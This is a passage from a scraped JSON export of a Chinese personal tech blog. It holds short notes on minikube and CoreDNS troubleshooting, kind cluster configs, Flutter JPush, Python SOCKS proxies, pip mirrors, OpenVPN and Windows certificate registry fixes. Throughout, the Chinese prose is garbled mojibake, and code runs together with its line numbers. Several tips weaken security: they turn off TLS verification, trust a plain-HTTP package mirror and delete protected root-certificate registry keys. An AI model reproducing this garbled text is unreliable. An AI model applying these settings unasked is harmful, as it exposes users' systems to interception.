minutes k8s_kube-addon-manager_kube-addon-manager-minikube_kube-system_6728e68c67451512f4a3f8ebf187f7c0_0f2acdb49eb70 b95b1efa0436 &quot;kube-controller-manâ€¦&quot; 40 minutes ago Up 40 minutes k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_ad79208e444afcf9288f50 3469ee8a9f_04b8c04231fe4 00638a24688b &quot;kube-scheduler --biâ€¦&quot; 40 minutes ago Up 40 minutes k8s_kube-scheduler_kube-scheduler-minikube_kube-system_6f3a3fe86a955711bb700f58d205f045_0f439564293e3 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 40 minutes ago Up 40 minutes k8s_POD_kube-apiserver-minikube_kube-system_34d581cbe7724b7c44f1bcc01808ce2b_06837d66351dc registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 40 minutes ago Up 40 minutes k8s_POD_etcd-minikube_kube-system_0b2be8e1a0609d0edec7456c26d2017e_06a8bbf2adb23 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 40 minutes ago Up 40 minutes k8s_POD_kube-addon-manager-minikube_kube-system_6728e68c67451512f4a3f8ebf187f7c0_00fb3bcacb6e7 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 40 minutes ago Up 40 minutes k8s_POD_kube-scheduler-minikube_kube-system_6f3a3fe86a955711bb700f58d205f045_048a9f8539f78 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 40 minutes ago Up 40 minutes k8s_POD_kube-controller-manager-minikube_kube-system_ad79208e444afcf9288f503469ee8a9f_0root@testminikube:~# docker logs dc90838be2c1.:532019-04-01T07:45:24.546Z [INFO] CoreDNS-1.3.12019-04-01T07:45:24.546Z [INFO] linux/amd64, go1.11.4, 6b56a9cCoreDNS-1.3.1linux/amd64, go1.11.4, 6b56a9c2019-04-01T07:45:24.546Z [INFO] plugin/reload: Running configuration MD5 = 599b9eb76b8c147408aed6a0bbe0f6692019-04-01T07:45:24.547Z [FATAL] plugin/loop: Loop (127.0.0.1:36695 -&gt; :53) detected for zone &quot;.&quot;, see https://coredns.io/plugins/loop#troubleshooting. Query: &quot;HINFO 1110760444785600987.5796964311732654450.&quot;åŸå› https://coredns.io/plugins/loop/#troubleshootingç”±äº ubuntu ç³»ç»Ÿå°† namserver è®¾ç½®ä¸º 127.0.0.53 å¯¼è‡´æ­¤é—®é¢˜è§£å†³ï¼š123systemctl disable systemd-resolvedvim /etc/resolvconf/resolv.conf.d/basenameserver 8.8.8.8å­˜ç–‘ï¼š123456789101112131415161718192021222324252627$ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc87d64f3d0c0 f9aed6605b81 &quot;/dashboard --insecuâ€¦&quot; 8 minutes ago Up 8 minutes k8s_kubernetes-dashboard_kubernetes-dashboard-9589d45df-zfmjf_kube-system_0eeb5738-5485-11e9-b716-08002761faf0_0e6a18d854acc registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 8 minutes ago Up 8 minutes k8s_POD_kubernetes-dashboard-9589d45df-zfmjf_kube-system_0eeb5738-5485-11e9-b716-08002761faf0_0e8c92c0f8637 eb516548c180 &quot;/coredns -conf /etcâ€¦&quot; 11 minutes ago Up 11 minutes k8s_coredns_coredns-d5947d4b-wwn57_kube-system_a39a6445-5484-11e9-b716-08002761faf0_25a49e2cb422b eb516548c180 &quot;/coredns -conf /etcâ€¦&quot; 11 minutes ago Up 11 minutes k8s_coredns_coredns-d5947d4b-bt7qr_kube-system_a399c170-5484-11e9-b716-08002761faf0_05509348a7611 4689081edb10 &quot;/storage-provisioner&quot; 11 minutes ago Up 11 minutes k8s_storage-provisioner_storage-provisioner_kube-system_a48d0d5a-5484-11e9-b716-08002761faf0_096689c775c18 eb516548c180 &quot;/coredns -conf /etcâ€¦&quot; 11 minutes ago Exited (2) 11 minutes ago k8s_coredns_coredns-d5947d4b-wwn57_kube-system_a39a6445-5484-11e9-b716-08002761faf0_19e2138641dbc registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 11 minutes ago Up 11 minutes k8s_POD_storage-provisioner_kube-system_a48d0d5a-5484-11e9-b716-08002761faf0_0b2594dd49453 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 11 minutes ago Up 11 minutes k8s_POD_coredns-d5947d4b-bt7qr_kube-system_a399c170-5484-11e9-b716-08002761faf0_084b9556eddcd 5cd54e388aba &quot;/usr/local/bin/kubeâ€¦&quot; 11 minutes ago Up 11 minutes k8s_kube-proxy_kube-proxy-rc8wh_kube-system_a3a0da36-5484-11e9-b716-08002761faf0_0613ceec2b398 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 11 minutes ago Up 11 minutes k8s_POD_kube-proxy-rc8wh_kube-system_a3a0da36-5484-11e9-b716-08002761faf0_0b1c59f3d3681 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 11 minutes ago Up 11 minutes k8s_POD_coredns-d5947d4b-wwn57_kube-system_a39a6445-5484-11e9-b716-08002761faf0_08f57f6f750f1 119701e77cbc &quot;/opt/kube-addons.sh&quot; 12 minutes ago Up 12 minutes k8s_kube-addon-manager_kube-addon-manager-minikube_kube-system_6728e68c67451512f4a3f8ebf187f7c0_0ec8cd3584a87 b95b1efa0436 &quot;kube-controller-manâ€¦&quot; 12 minutes ago Up 12 minutes k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_81af92d0afc7c18b923d3c1cfeb25dde_054e552b6447a 00638a24688b &quot;kube-scheduler --biâ€¦&quot; 12 minutes ago Up 12 minutes k8s_kube-scheduler_kube-scheduler-minikube_kube-system_6f3a3fe86a955711bb700f58d205f045_0038a39ad50eb 2c4adeb21b4f &quot;etcd --advertise-clâ€¦&quot; 12 minutes ago Up 12 minutes k8s_etcd_etcd-minikube_kube-system_fd5daa32004de0c636e0fe0efc91f2a7_0dbfda924e721 ecf910f40d6e &quot;kube-apiserver --adâ€¦&quot; 12 minutes ago Up 12 minutes k8s_kube-apiserver_kube-apiserver-minikube_kube-system_523956c1c877d6074e0ef2c35d1a3aa0_0dc951ebb6bb6 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 12 minutes ago Up 12 minutes k8s_POD_kube-apiserver-minikube_kube-system_523956c1c877d6074e0ef2c35d1a3aa0_02936483c8f38 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 12 minutes ago Up 12 minutes k8s_POD_etcd-minikube_kube-system_fd5daa32004de0c636e0fe0efc91f2a7_0b079ca751d3a registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 12 minutes ago Up 12 minutes k8s_POD_kube-addon-manager-minikube_kube-system_6728e68c67451512f4a3f8ebf187f7c0_0491f459137e4 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 12 minutes ago Up 12 minutes k8s_POD_kube-scheduler-minikube_kube-system_6f3a3fe86a955711bb700f58d205f045_07eb83411c127 registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 &quot;/pause&quot; 12 minutes ago Up 12 minutes k8s_POD_kube-controller-manager-minikube_kube-system_81af92d0afc7c18b923d3c1cfeb25dde_0$ docker logs 96689c775c18E0401 13:47:09.340208 1 reflector.go:134] github.com/coredns/coredns/plugin/kubernetes/controller.go:322: Failed to list *v1.Namespace: Get https://10.96.0.1:443/api/v1/namespaces?limit=500&amp;resourceVersion=0: tls: server selected unsupported protocol version 302E0401 13:47:09.340208 1 reflector.go:134] github.com/coredns/coredns/plugin/kubernetes/controller.go:322: Failed to list *v1.Namespace: Get https://10.96.0.1:443/api/v1/namespaces?limit=500&amp;resourceVersion=0: tls: server selected unsupported protocol version 302log: exiting because of error: log: cannot create log: open /tmp/coredns.coredns-d5947d4b-wwn57.unknownuser.log.ERROR.20190401-134709.1: no such file or directory","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kind æ­å»º k8s","slug":"history/tech/5c99f637eac98afd5388910a","date":"2019-03-25T21:51:51.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c99f637eac98afd5388910a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c99f637eac98afd5388910a/","excerpt":"","text":"kubectl å®‰è£…ç”±äº API ç‰ˆæœ¬å…¼å®¹çš„é—®é¢˜ï¼Œå°½é‡ä¿æŒ kubectl ç‰ˆæœ¬ä¸ K8S é›†ç¾¤ç‰ˆæœ¬ä¿æŒä¸€è‡´ï¼Œæˆ–ç‰ˆæœ¬ç›¸å·®åœ¨åœ¨ä¸€ä¸ªå°ç‰ˆæœ¬å†…https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl1curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.14.0/bin/linux/amd64/kubectlæˆ–è€…åœ¨ k8s github åœ°å€ changelog ä¸­ä¸‹è½½1https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.14.md kind å®‰è£…kind å®˜æ–¹ä¸‹è½½åœ°å€:https://github.com/kubernetes-sigs/kind/releasesæˆ–è€…ä½¿ç”¨ go get å®‰è£…ï¼š1go get sigs.k8s.io/kindå¯åŠ¨ç¤ºä¾‹ï¼š12kind create cluster --image kindest/node:v1.13.4 --config kind-config.yaml --name kindkind create cluster --image kindest/node:v1.13.4 --config kind-ha-config.yaml --name kind // æ­å»ºé«˜å¯ç”¨é›†ç¾¤ä¿®æ”¹ç¯å¢ƒå˜é‡:12export KUBECONFIG=&quot;$(kind get kubeconfig-path --name=&quot;kind&quot;)&quot;kubectl cluster-infokind-config.yaml:123456789101112131415161718192021222324kind: ClusterapiVersion: kind.sigs.k8s.io/v1alpha3kubeadmConfigPatches:- | apiVersion: kubeadm.k8s.io/v1beta1 kind: InitConfiguration metadata: name: config networking: serviceSubnet: 10.0.0.0/16 imageRepository: registry.aliyuncs.com/google_containers- | apiVersion: kubeadm.k8s.io/v1beta1 kind: ClusterConfiguration metadata: name: config networking: serviceSubnet: 10.0.0.0/16 imageRepository: registry.aliyuncs.com/google_containers nodeRegistration: kubeletExtraArgs: pod-infra-container-image: registry.aliyuncs.com/google_containers/pause:3.1nodes:- role: control-planekind-ha-config.yaml:123456789101112131415161718192021222324252627282930kind: ClusterapiVersion: kind.sigs.k8s.io/v1alpha3kubeadmConfigPatches:- | apiVersion: kubeadm.k8s.io/v1beta1 kind: InitConfiguration metadata: name: config networking: serviceSubnet: 10.0.0.0/16 imageRepository: registry.aliyuncs.com/google_containers- | apiVersion: kubeadm.k8s.io/v1beta1 kind: ClusterConfiguration metadata: name: config networking: serviceSubnet: 10.0.0.0/16 imageRepository: registry.aliyuncs.com/google_containers nodeRegistration: kubeletExtraArgs: pod-infra-container-image: registry.aliyuncs.com/google_containers/pause:3.1nodes:- role: control-plane- role: control-plane- role: control-plane- role: worker- role: worker- role: workerå‚è€ƒèµ„æ–™:kind æ–‡æ¡£ï¼šhttps://kind.sigs.k8s.io/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos ç¼–è¯‘å®‰è£… git","slug":"history/tech/5c99c467eac98afd53889109","date":"2019-03-25T18:19:19.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c99c467eac98afd53889109/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c99c467eac98afd53889109/","excerpt":"","text":"12345yum install autoconfyum install -y openssl-develyum install curl-develyum install expat-develmake prefix=/usr install","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"flutter é›†æˆ jpush å‘çˆ¹å°è®¡","slug":"history/tech/5c90901aeac98afd53889107","date":"2019-03-18T18:45:46.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c90901aeac98afd53889107/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c90901aeac98afd53889107/","excerpt":"","text":"123456é‡ç‚¹ iOSç«¯ è¦è®¾ç½® production çš„å€¼ å¦åˆ™ç¼–è¯‘å¯åŠ¨ä¼šå‡ºé”™ï¼Œå› ä¸ºiOSçš„ä»£ç è®¿é—®è¿™ä¸ªå˜é‡ä¸ºç©ºå€¼ï¼Œæ²¡æœ‰å¤„ç† jpush.setup( appKey: &quot;6f1d31c55f7f0ff78e2b5148&quot;, channel: &quot;theChannel&quot;, production: true, debug: true);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"flutter","slug":"flutter","permalink":"https://wangxiuwen.github.io/tags/flutter/"}],"author":"baipeng"},{"title":"vscode è¿è¡Œgo test æ˜¾ç¤ºæ‰“å°æ—¥å¿—","slug":"history/tech/5c8874b6eac98afd53889106","date":"2019-03-13T03:10:46.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c8874b6eac98afd53889106/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c8874b6eac98afd53889106/","excerpt":"","text":"1&quot;go.testFlags&quot;: [&quot;-v&quot;]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"golang dep ä½¿ç”¨ç§æœ‰ä»“åº“","slug":"history/tech/5c709788be40978f3d5734b6","date":"2019-02-23T00:44:56.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c709788be40978f3d5734b6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c709788be40978f3d5734b6/","excerpt":"","text":"vim ~/.gitconfig12[url &quot;git@code.aliyun.com:&quot;] insteadOf = https://code.aliyun.com/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go åˆ¤æ–­æ‰§è¡Œçš„æ“ä½œç³»ç»Ÿ","slug":"history/tech/5c700c84be40978f3d5734b5","date":"2019-02-22T02:51:48.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c700c84be40978f3d5734b5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c700c84be40978f3d5734b5/","excerpt":"","text":"1switch runtime.GOOS &#123; case &quot;darwin&quot;: case &quot;windows&quot;: case &quot;linux&quot;: &#125;æŸ¥æ‰¾ç³»ç»Ÿ:1go tool dist list -json","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"python requests ä½¿ç”¨ ss ä»£ç†","slug":"history/tech/5c6fae08be40978f3d5734b4","date":"2019-02-21T20:08:40.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c6fae08be40978f3d5734b4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c6fae08be40978f3d5734b4/","excerpt":"","text":"12345678proxies = &#123;&apos;http&apos;: &apos;socks5h://127.0.0.1:1086&apos;, &apos;https&apos;: &apos;socks5h://127.0.0.1:1086&apos;&#125;result = requests.post( &lt;url&gt;, data=&lt;data&gt;, headers=&lt;headers&gt;, timeout=100, verify=False, proxies=proxies)socks5 å’Œ socks5h çš„åŒºåˆ«:1234socks5h: the hostname is resolved by the SOCKS server (also known as CURLPROXY_SOCKS5_HOSTNAME type);socks5: the hostname is resolved locally;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"pip é…ç½®æ–‡ä»¶","slug":"history/tech/5c6b7d924c69346505fe3452","date":"2019-02-19T03:52:50.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c6b7d924c69346505fe3452/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c6b7d924c69346505fe3452/","excerpt":"","text":"123456vim /root/.pip[global]index-url=http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"é€šè¿‡OpenVPNæ¥ç©¿è¶Šä¸Šç½‘","slug":"history/tech/5c68fdd84c69346505fe3451","date":"2019-02-16T18:23:20.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c68fdd84c69346505fe3451/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c68fdd84c69346505fe3451/","excerpt":"","text":"server.conf1push &quot;redirect-gateway def1 bypass-dhcp&quot; # å…è®¸å®¢æˆ·ç«¯é‡å®šå‘ç©¿è¶ŠVPNåˆ°å¤–ç½‘client.ovpn1redirect-gateway def1 #ä½¿å®¢æˆ·ç«¯ä¸­æ‰€æœ‰æµé‡ç»è¿‡VPN","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"confluence 504","slug":"history/tech/5c64f5f1311ba7740ed98863","date":"2019-02-13T17:00:33.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c64f5f1311ba7740ed98863/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c64f5f1311ba7740ed98863/","excerpt":"","text":"è°ƒæ•´ jvm å‚æ•°ï¼š123vim /usr/local/confluence/bin/setenv.shJAVA_OPTS=&quot;-Xms4096m -Xmx4096m -XX:MaxPermSize=512m $JAVA_OPTS -Djava.awt.headless=true &quot;å¯åŠ¨/åœæ­¢/é‡å¯ï¼š1/usr/local/confluence/bin# /etc/init.d/confluence &#123;start|stop|restart&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"golang time å‘çˆ¹ç¬”è®°","slug":"history/tech/5c525e6bd5a4cf4603f130af","date":"2019-01-31T02:33:15.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c525e6bd5a4cf4603f130af/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c525e6bd5a4cf4603f130af/","excerpt":"","text":"1time format æ“ä½œä½¿ç”¨ Time å®ä¾‹è®°å½•çš„æ—¶åŒºï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯æœ¬åœ°æ—¶åŒºï¼›å¦ä¸€æ–¹é¢ï¼Œparse æ“ä½œåœ¨å¹¶ä¸ä¼šé»˜è®¤ä½¿ç”¨æœ¬åœ°æ—¶åŒºã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"xml é…ç½®æ–‡ä»¶è¯»å–é—®é¢˜ã€‚","slug":"history/tech/5c515a6ad5a4cf4603f130ae","date":"2019-01-29T20:03:54.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c515a6ad5a4cf4603f130ae/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c515a6ad5a4cf4603f130ae/","excerpt":"","text":"12ç¦æ­¢ä½¿ç”¨ideaçš„æ ¼å¼åŒ–å¿«æ·é”®ï¼Œæ ¼å¼åŒ–ã€‚ä¸è¦ä¸ºäº†å¥½çœ‹è€Œæ ¼å¼åŒ–ã€‚å¦åˆ™ä½ å°±å¾—å¤„ç†/n æ¢è¡Œçš„é—®é¢˜ã€‚å°è®¡~~~ğŸ¥","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"chrome ERR_UNSAFE_PORT","slug":"history/tech/5c497295d5a4cf4603f130ad","date":"2019-01-23T20:08:53.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c497295d5a4cf4603f130ad/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c497295d5a4cf4603f130ad/","excerpt":"","text":"é€‰ä¸­Google Chrome å¿«æ·æ–¹å¼ï¼Œå³é”®å±æ€§ï¼Œåœ¨â€ç›®æ ‡â€å¯¹åº”æ–‡æœ¬æ¡†æ·»åŠ ï¼š1--explicitly-allowed-ports=87,6666,556,6667","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"flutter  get  gzip (stdin) trailing garbage ignored","slug":"history/tech/5c41c74fb77f63ce2b1a9ed5","date":"2019-01-18T00:32:15.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c41c74fb77f63ce2b1a9ed5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c41c74fb77f63ce2b1a9ed5/","excerpt":"","text":"æŠ¥é”™:1flutter get gzip: (stdin): trailing garbage ignoredè§£å†³:12345678Building flutter tool...gzip: (stdin): trailing garbage ignoredgzip: (stdin): trailing garbage ignoredtar: Child returned status 1tar: Error is not recoverable: exiting nowgzip: (stdin): trailing garbage ignoredgzip: (stdin): trailing garbage ignoredWrite failed (OS Error: Broken pipe, errno = 32), port = 0è§£å†³åŠæ³•å¸è½½brew å®‰è£…çš„ gnu-tar, è‡³å°‘æˆ‘è¿™æ ·æ˜¯è§£å†³äº†ã€‚åŸè´´ä¹Ÿæœ‰è¯„è®ºè¯´æ²¡å…³ç³»çš„ã€https://github.com/flutter/flutter/issues/110741brew uninstall gnu-tar","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"chromeå†…æ ¸æ‰“å¼€ç½‘ç«™ç¼“æ…¢","slug":"history/tech/5c408303b77f63ce2b1a9ed4","date":"2019-01-17T01:28:35.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c408303b77f63ce2b1a9ed4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c408303b77f63ce2b1a9ed4/","excerpt":"","text":"æ­¥éª¤ï¼š- åˆ é™¤HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Root\\ProtectedRoots - åˆ é™¤HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates - åˆ é™¤HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Root - æ‰¾åˆ°æ³¨å†Œè¡¨é”®å€¼HKEY_CURRENT_USER\\Software\\Microsoft\\SystemCertificates\\Root\\ProtectedRootsï¼Œå³é”®ç‚¹ã€æƒé™ã€‘ï¼ŒæŠŠæ‰€æœ‰ç”¨æˆ·åï¼Œéƒ½è®¾ç½®æˆå®Œå…¨æ§åˆ¶æƒé™ï¼Œç‚¹ç¡®å®šï¼Œå³é”®ProtectedRootsï¼Œç‚¹åˆ é™¤ - å¦‚æœæ— æ³•åˆ é™¤ï¼Œéœ€è¦ç‚¹æ§åˆ¶é¢æ¿ï¼Œç‚¹â€œè´¦æˆ·â€ï¼Œç‚¹â€œæ”¹ç”¨æœ¬åœ°è´¦æˆ·ç™»é™†â€ï¼Œç„¶åæ³¨é”€ï¼Œå†æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤åˆ é™¤ï¼› - å‡ºç°â€œæ— æ³•ä¿å­˜å¯¹ProtectedRoots æƒé™æ‰€ä½œçš„æ›´æ”¹â€ï¼Œä¸»è¦åŸå› æ˜¯www.winwin7.comæ‰€æœ‰è€…ä¸å¯¹ã€‚å³é”®ProtectedRootsç‚¹â€œæƒé™â€ï¼Œç‚¹â€œé«˜çº§â€ï¼Œæ‰¾åˆ°â€œæ‰€æœ‰è€…â€ï¼Œå¦‚ä¸‹å›¾æ‰€æœ‰è€…æ˜¯Administratorï¼Œç‚¹å³è¾¹çš„â€œæ›´æ”¹â€ï¼Œå‡ºç°ç•Œé¢åï¼Œç‚¹é«˜çº§ï¼Œç‚¹ç«‹å³æŸ¥æ‰¾ï¼Œæ‰¾åˆ°æœ¬åœ°è´¦æˆ·ï¼Œæ¯”å¦‚â€œå¼ ä¸‰â€ï¼Œä¸€è·¯ç‚¹ç¡®å®šï¼Œç„¶åå†åˆ é™¤è¯•è¯•ï¼› - å¦‚æœæ‰€æœ‰è€…å¯¹äº†ï¼Œå®Œå…¨æ§åˆ¶ä¹Ÿå¯ä»¥è®¾ç½®å¥½äº†ï¼Œè¿˜æ˜¯æ— æ³•åˆ é™¤ï¼Œå¯èƒ½æ˜¯é”®å€¼æœ‰çˆ¶å¯¹è±¡ã€‚å³é”®ProtectedRootsç‚¹â€œæƒé™â€ï¼Œç‚¹â€œé«˜çº§â€ç‚¹â€œç¦ç”¨ç»§æ‰¿â€ï¼Œå¼¹å‡ºæ¡†é€‰ç¬¬ä¸€ä¸ªï¼Œç‚¹ç¡®å®šï¼Œå˜æˆâ€œæ— â€ï¼Œç¡®å®šç¡®å®šä¿å­˜è®¾ç½®åœ¨åˆ 